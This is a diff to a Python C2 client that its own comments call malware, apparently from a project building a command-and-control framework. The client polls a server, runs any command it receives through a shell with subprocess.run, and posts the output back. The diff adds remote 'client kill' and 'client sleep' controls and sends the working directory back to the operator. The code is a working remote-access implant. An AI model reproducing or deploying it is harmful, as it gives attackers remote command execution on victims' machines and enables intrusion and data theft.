@@ -70,13 +70,13 @@ while True:
             sleep(DELAY)
             continue #jump to the last iteration of the loop(while True:)
         except KeyboardInterrupt:
-            print(Fore.LIGHTMAGENTA_EX+"[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
+            print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
             exit()
     except KeyboardInterrupt:
-        print(Fore.LIGHTMAGENTA_EX+"[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
+        print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
         exit()
     except Exception as e:
-        print(Fore.LIGHTYELLOW_EX+"[!] Unknown Error when Sending Request to C2 Server"+Fore.RESET)
+        print(Fore.LIGHTYELLOW_EX+"\n[!] Unknown Error when Sending Request to C2 Server"+Fore.RESET)
         print(f'Error Content: {e}')
         exit()
 
@@ -87,11 +87,14 @@ while True:
     if len(command) == 2 and command == "cd":
         homeDirectory = path.expanduser("~")
         chdir(homeDirectory)
+        post_to_server(homeDirectory,CWD_RESPONSE)
 
     # if the Command is cd follow below blocks, first check cd with an input path
     if command.startswith("cd "):
+        # Splicing the command to remove the cd and the extract directory path
         directory = command[3:]
 
+        # Try to Change Directory and handle the error if it occurs
         try:
             chdir(directory)
         except FileNotFoundError:
@@ -102,11 +105,35 @@ while True:
             post_to_server(f"You have don't Permission to Access{directory}.\n")
         except OSError:
             post_to_server("There was a Operation System Error on client.\n")
+        # If not error, send the current directory to the server for using in Prompt
         else:
             post_to_server(getcwd(),CWD_RESPONSE)
 
+    #the client Kill Command shutdown our malware
+    elif command.startswith("client kill"):
+        post_to_server(f"{client} has been Killed. \n")
+        exit()
+    # the client sleep SECOND command will sleep the client for number of seconds
+    elif command.startswith("client sleep "):
+        # Slicing the command to remove the client sleep and the extract delay
+        try:
+            delay = float(command.split()[2])
+            # if delay under zero raise ValueError
+            if delay < 0:
+                raise ValueError
+        # Handle ValueError & IndexError Exceptions
+        except (IndexError, ValueError):
+            post_to_server("You must Enter a Positive Number for Sleep Delay in Seconds.\n")
+
+        # if No Excepts happens, sleep the client for the delay seconds and send a message to the server
+        else:
+            post_to_server(f"{client} go to Sleep for {delay} seconds.\n")
+            sleep(delay)
+            # After sleep, client awake and then send a client awake message to the server
+            post_to_server(f"{client} is now Awake.\n")
+
+    # Run command using subprocess.run module
     else:
-        # Run command using subprocess.run module
         commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
         post_to_server(commandOutput.stdout)
 
